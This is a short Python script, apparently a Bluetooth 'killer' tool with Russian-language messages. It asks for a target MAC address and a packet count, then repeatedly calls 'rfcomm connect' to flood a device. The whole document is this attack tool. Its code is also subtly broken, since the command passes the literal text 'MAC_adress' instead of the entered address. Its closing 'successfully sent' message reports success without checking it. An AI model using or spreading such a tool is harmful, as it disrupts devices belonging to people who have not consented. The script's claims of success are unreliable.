#===========================================================================
#!/usr/bin env python
import subprocess
import sys
import time
import os
from termcolor import colored



if os.sys.platform == 'win32':
    print(colored('Этот скрипт работает только на Linux!!!','red', attrs=['blink']))
    time.sleep(5)
    sys.exit(0)
#==========================START_BANNER=====================================
print(colored('Loading.', 'yellow'))
time.sleep(1)
os.system('clear')

print(colored('Loading..', 'red'))
time.sleep(1)
os.system('clear')

print(colored('Loading...', 'green'))
time.sleep(1)
os.system('clear')

print(colored('Successfully!', 'green'))
time.sleep(1)
os.system('clear')
#==========================BANNER===========================================
print(colored('mmmmm  m      m    m        m    m mmmmm  m      m      mmmmmm mmmmm', 'red'))
print(colored('#    # #      #    #        #  m"    #    #      #      #      #   "#', 'red'))
print(colored('#mmmm" #      #    #        #m#      #    #      #      #mmmmm #mmmm"', 'red'))
print(colored('#    # #      #    #        #  #m    #    #      #      #      #   "m', 'red'))
print(colored('#mmmm" #mmmmm "mmmm"        #   "m mm#mm  #mmmmm #mmmmm #mmmmm #    m', 'red'))
#==========================CONFIG===========================================
conf = ['rfcomm','connect','MAC_adress','1']
MAC_adress = input(colored('MAC_adress : ','blue'))
thear = int(input(colored('Packages: ','blue')))

print(colored('Connect to '+ MAC_adress +'...','green', attrs=['blink']))
time.sleep(3)
#==========================START============================================
for i in range(0, thear):
    subprocess.call(conf)
#==========================EXIT=============================================
time.sleep(1)
os.system("clear") 
print(colored('Успешно отправлено '+ str(thear) +' пакетов на '+ MAC_adress +'!\nНажмите CTRL + Z или Enter чтобы выйти','green'))
input()
#===========================================================================
